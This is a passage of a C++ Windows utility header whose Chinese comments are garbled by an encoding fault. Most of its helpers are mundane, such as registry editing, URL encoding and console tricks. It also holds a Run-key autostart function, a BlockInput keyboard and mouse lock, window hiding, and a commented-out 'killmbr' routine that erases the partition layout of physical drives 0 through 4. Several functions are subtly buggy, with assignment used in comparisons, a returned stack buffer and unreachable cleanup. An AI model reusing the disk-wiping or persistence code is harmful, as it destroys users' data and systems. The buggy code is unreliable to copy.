 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
bool DelReg(const char* path)
{
	int ret = RegDeleteKey(HKEY_LOCAL_MACHINE, path);
	if (ret == ERROR_SUCCESS)return 1; 
	else return 0;
}

/******************************
 *  @brief     ɾ��ע���ֵ 
 *  @param     path:·��, value��ֵ 
 *  @note      ͷ�ļ��� #include <windows.h>
 *  @Sample usage: DelRegValue("Software\\xbebhxx3","aaa");
 *  @ Return:   1�ɹ���0ʧ�� 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
bool DelRegValue(const char* path,const char* Value){
    HKEY hKey;                               
    LONG ret = RegOpenKeyEx( HKEY_LOCAL_MACHINE,path,0, KEY_QUERY_VALUE| KEY_WRITE, &hKey );                               
    if( ret == ERROR_SUCCESS ){
		RegDeleteValue(hKey,Value);
		return 1;
	} 
    return 0;
    RegCloseKey(hKey);
}

/******************************
 *  @brief     ���ÿ������� 
 *  @param     name:��������fSuspend:1������0�ر� 
 *  @note      ͷ�ļ��� #include <windows.h>
 *  @Sample usage: AutoRun(��������1); 
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2021/10/4 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
void AutoRun(const char* name,BOOL fSuspend) {
	if(fSuspend==1){
		char szFilePath[MAX_PATH + 1] = { 0 };
		GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
		WriteReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",name,szFilePath);
	}else{
		DelRegValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run",name);
	}
}

//ע���������� 

//��/���������ʼ 

/******************************
 *  @brief     Url���� 
 *  @param     ��Ҫ����Ķ��� 
 *  @Sample usage: CodeUrl(��Ҫ����Ķ���); 
 *  @return 	������ 
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2021/10/14 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
string CodeUrl(const string &URL){
	string result = "";
	for ( unsigned int i=0; i<URL.size(); i++ ) {
		char c = URL[i];
		if (( '0'<=c && c<='9' ) ||( 'a'<=c && c<='z' ) ||( 'A'<=c && c<='Z' ) ||c=='/' || c=='.') result += c;
		else {
			int j = (short int)c;
			if ( j < 0 ) j += 256;
	   		int i1, i0;
	   		i1 = j / 16;
	   		i0 = j - i1*16;
	   		result += '%';
			if ( 0 <= i1 && i1 <= 9 ) result += char( short('0') + i1 );
			else if ( 10 <= i1 && i1 <= 15 ) result += char( short('A') + i1 - 10 );
			if ( 0 <= i0 && i0 <= 9 ) result += char( short('0') + i0 );
			else if ( 10 <= i0 && i0 <= 15 ) result += char( short('A') + i0 - 10 );
		}
	}
 return result;
}
 
/******************************
 *  @brief     Url���� 
 *  @param     ��Ҫ����Ķ��� 
 *  @Sample usage: decodeUrl(��Ҫ����Ķ���); 
 *  @return 	������ 
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2021/10/14 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
string DecodeUrl(const string &URL) {
	string result = "";
	for (unsigned int i=0;i<URL.size();i++) {
		char c = URL[i];
		if ( c != '%' ) result += c;
	 	else {
			char c1 = URL[++i];
			char c0 = URL[++i];
			int num = 0;
			if ( '0'<=c1 && c1<='9' ) num += short(c1-'0')* 16;
			else if ( 'a'<=c1 && c1<='f' ) num += ( short(c1-'a') + 10 )* 16;
			else if ( 'A'<=c1 && c1<='F' ) num += ( short(c1-'A') + 10 )* 16;
			if ( '0'<=c0 && c0<='9' ) num += short(c0-'0');
			else if ( 'a'<=c0 && c0<='f' ) num += ( short(c0-'a') + 10 );
			else if ( 'A'<=c0 && c0<='F' ) num += ( short(c0-'A') + 10 );
			result += char(num);
		}
 }
 return result;
}

/******************************
 *  @brief     ����
 *  @param     ��Ҫ���ܵĶ��� 
 *  @Sample usage: x3code(��Ҫ���ܵĶ���); 
 *  @return 	���ܺ�� 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/30 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
string x3code(string c){
	for(int i=0;i<=sizeof(c);i++){
	if((c[i]>='A'&&c[i]<='V')||(c[i]>='a'&&c[i]<='v')){
		c[i]=(c[i]^8)+4; 
	}else if((c[i]>='W'&&c[i]<='Z')||(c[i]>='w'&&c[i]<='z')){
		c[i]=(c[i]^6)-22;
	}else if((c[i]>='1'&&c[i]<='4')){
		c[i]=(c[i]^4)-8;
	}else if((c[i]>='5'&&c[i]<='9')){
		c[i]=(c[i]^7)+22;
	}else if((c[i]>=' '&&c[i]<='(')){
		c[i]=(c[i]^2)-21;
	}else if((c[i]>=')'&&c[i]<='/')){
		c[i]=(c[i]^3)+12;
	}else;
	}
	return c;
}
//����������� 

//�ı���ɫ��ʼ

/******************************
 *  @brief      RGB��ʼ�� 
 *  @Sample usage: rgb_init()
*  @note		ͷ�ļ��� #include<Windows.h>
 *  @author     jlx
 *  @version    1.0
 *  @date       2022/3/5 
******************************/
void rgb_init() {																// ��ʼ��
	HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);		//������
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);		//������
	DWORD dwInMode, dwOutMode;
	GetConsoleMode(hIn, &dwInMode);						//��ȡ����̨����ģʽ
	GetConsoleMode(hOut, &dwOutMode);					//��ȡ����̨���ģʽ
	dwInMode |= 0x0200;									//����
	dwOutMode |= 0x0004;
	SetConsoleMode(hIn, dwInMode);						//���ÿ���̨����ģʽ
	SetConsoleMode(hOut, dwOutMode);					//���ÿ���̨���ģʽ
}

/******************************
 *  @brief      RGB����
 *  @param		wr:�����,wg:������,wb:������,br:������,bg:������,bb:������ (0-255) 
 *  @Sample usage: rgb_set(255,255,255,0,0,0);
 *  @note		����֮ǰ������ rgb_init(); 
 *  @author     jlx
 *  @version    1.0
 *  @date       2022/3/5 
******************************/
void rgb_set(int wr,int wg,int wb,int br,int bg,int bb) {
	printf("\033[38;2;%d;%d;%dm\033[48;2;%d;%d;%dm",wr,wg,wb,br,bg,bb);	//\033[38��ʾǰ����\033[48��ʾ����������%d��ʾ��ϵ���
}

//�ı���ɫ����
 
/******************************
 *  @brief     ���������� (��Ҫ����ԱȨ��)
 *  @param     NULL
 *  @Return:    1�ɹ���0ʧ�� 
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: lockkm(1); ������lockkm(0); ���� 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool lockkm(bool lockb=false){
	cout<<lockb;
	HINSTANCE hIn = NULL;
	hIn = LoadLibrary("user32.dll");
	if(hIn){
        BOOL (_stdcall *BlockInput)(BOOL bFlag);
        BlockInput = (BOOL (_stdcall *)(BOOL bFlag)) GetProcAddress(hIn, "BlockInput");
        if (BlockInput) return BlockInput(lockb);
        else return 0;
    }else return 0;
}

/******************************
 *  @brief     ������λ�� 
 *  @param     NULL
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: mouxy(���x���꣬y����); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/5/2
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
void mouxy(int &x,int &y) {
	POINT p;
	GetCursorPos(&p);//��ȡ�������
	x=p.x;
	y=p.y;
}

/******************************
 *  @brief     ���� 
 *  @param     NULL
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: cls(); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/9/14
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
 void cls() {
    HANDLE hdout = GetStdHandle(STD_OUTPUT_HANDLE);    //��ȡ��׼����豸�ľ��
    CONSOLE_SCREEN_BUFFER_INFO csbi;    //�����ʾ��Ļ���������Եı���
    GetConsoleScreenBufferInfo(hdout, &csbi);  //��ȡ��׼����豸����Ļ����������
    DWORD size = csbi.dwSize.X * csbi.dwSize.Y, num = 0; //����˫�ֽڱ���
    COORD pos = {0, 0};    //��ʾ����ı�������ʼ��Ϊ���Ͻ�(0, 0)�㣩
    //�Ѵ��ڻ�����ȫ�����Ϊ�ո����ΪĬ����ɫ��������
    FillConsoleOutputCharacter(hdout, ' ', size, pos, &num);
    FillConsoleOutputAttribute (hdout, csbi.wAttributes, size, pos, &num );
    SetConsoleCursorPosition(hdout, pos);    //��궨λ���������Ͻ�
}

/******************************
 *  @brief     strɾ���ո� 
 *  @param     s:Ҫɾ���ո��string���� 
 *  @note      ͷ�ļ��� #include <Windows.h>
 *  @Sample usage: delspace(Ҫɾ���ո��string����); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/9/14
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
 void delspace(string &s)
{
	int index = 0;
	if( !s.empty())while( (index = s.find(' ',index)) != string::npos) s.erase(index,1);
 }

/******************************
 *  @brief     ��õ�ǰip 
 *  @note      ͷ�ļ��� #include <WinSock2.h>	����ʱ��-lgdi32 -lwsock32 
 *  @Sample usage: ip(); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/9/23
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
string getIp(){
	WSADATA wsaData;
    int ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
    char hostname[256];
    ret = gethostname(hostname, sizeof(hostname));
    HOSTENT* host = gethostbyname(hostname);
    return inet_ntoa(*(in_addr*)*host->h_addr_list);
} 

/******************************
 *  @brief     ��õ�ǰ�û��� 
 *  @Sample usage: GetUser(); 
 *  @return 	��ǰ�û���
  *  @note		ͷ�ļ��� #include<Windows.h>
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/2/28 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string GetUser(){
	char currentUser[256]={0};
	DWORD dwSize_currentUser = 256;
	GetUserName(currentUser,&dwSize_currentUser);
	return currentUser; 
}

/******************************
 *  @brief     ���ϵͳ�汾 
 *  @Sample usage: GetSystemVersion(); 
 *  @return 	ϵͳ�汾 
 *  @note		ͷ�ļ��� #include<Windows.h>
 *  @author     xbebhxx3
 *  @version    4.0
 *  @date       2021/2/24 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string GetSystemVersion (){
	OSVERSIONINFO osv = {0};
	osv.dwOSVersionInfoSize = sizeof(osv);
	if(!GetVersionEx(&osv))return 0;
	else if(osv.dwMajorVersion = 10 && osv.dwMinorVersion ==0)return "Windows 10";//or windows server 2016
	else if(osv.dwMajorVersion = 6 && osv.dwMinorVersion ==3)return "Windows 8.1";//or windows server 2012 R2
	else if(osv.dwMajorVersion = 6 && osv.dwMinorVersion ==2)return "Windows 8";//or windows server 2012
	else if(osv.dwMajorVersion = 6 && osv.dwMinorVersion ==1)return "Windows 7"; //or windows server 2008 R2
	else if(osv.dwMajorVersion = 6 && osv.dwMinorVersion ==0)return "Windows Vista";//or windows server 2008
	else if(osv.dwMajorVersion = 5 && osv.dwMinorVersion ==2)return "Windows server 2003";//or windows server 2003 R2
	else if(osv.dwMajorVersion = 5 && osv.dwMinorVersion ==1)return "Windows xp";
	else if(osv.dwMajorVersion = 5 && osv.dwMinorVersion ==1)return "Windows 2000";
	else return "err";
	
}

/******************************
 *  @brief     ִ��cmd�����÷���ֵ 
 *  @Sample usage: getCmdResult("echo 1"); 
 *  @return 	����ֵ 
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2022/3/5 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
char* getCmdResult(char* Cmd)  {
	char Result[1024000] = {0};
    char buf1[1024000] = {0};
    FILE *pf = popen(Cmd, "r");
    while(fgets(buf1, sizeof buf1, pf)) snprintf(Result,1024000,"%s%s",Result , buf1);
    pclose(pf);
    memset(Cmd,'\0',sizeof(Cmd));
    return Result;
}

/******************************
 *  @brief     ������� 
 *  @param     str:Ҫ������ַ���,y:������ڼ���; 
 *  @Sample usage:  OutoutMiddle(�ַ���,����);
 *  @note		ͷ�ļ��� #include<Windows.h>
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/8 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
void OutoutMiddle(const char str[],int y){
	COORD pos;
	HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE);//�������ľ��
    CONSOLE_SCREEN_BUFFER_INFO bInfo;
    GetConsoleScreenBufferInfo(hOutput, &bInfo);//��ȡ����̨��Ļ��������С
    int dwSizeX=bInfo.dwSize.X,dwSizey=bInfo.dwSize.Y;
    int len=strlen(str);//��ȡҪ������ַ����ĳ���
	int x=dwSizeX/2-len/2;
	pos.X = x; //������
	pos.Y = y; //������
	SetConsoleCursorPosition(hOutput, pos);//�ƶ���� 
	printf("%s",str);//��� 
}

//���ش��� #include<Windows.h>
void HideWindow(){
	ShowWindow(GetForegroundWindow(),SW_HIDE);
} 

//�桤ȫ�� ��� ȡ�����������߿�#include<Windows.h>
void full_screen() {
	HWND hwnd = GetForegroundWindow();
	int cx = GetSystemMetrics(SM_CXSCREEN);            /* ��Ļ��� ���� */
	int cy = GetSystemMetrics(SM_CYSCREEN);            /* ��Ļ�߶� ���� */

	LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE);   /* ��ȡ������Ϣ */
	/* ���ô�����Ϣ ��� ȡ�����������߿� */
	SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);

	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx+18, cy, 0);
}

/******************************
 *  @brief     �ƻ�mbr(very danger) 
 *  @Sample usage:  killmbr();
 *  @note		ͷ�ļ��� #include<Windows.h> #include<ntddscsi.h> 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/8 
 #  Copyright (c) 2022-2077 xbebhxx3


void killmbr(){
    DWORD lpBytesReturned;
    OVERLAPPED lpOverlapped={0};
    HANDLE DiskHandle=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);//�ƻ�mbr 
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
    DiskHandle=CreateFile("\\\\.\\PhysicalDrive1",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
    DiskHandle=CreateFile("\\\\.\\PhysicalDrive2",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
    DiskHandle=CreateFile("\\\\.\\PhysicalDrive3",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
    DiskHandle=CreateFile("\\\\.\\PhysicalDrive4",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
}
******************************/
#endif
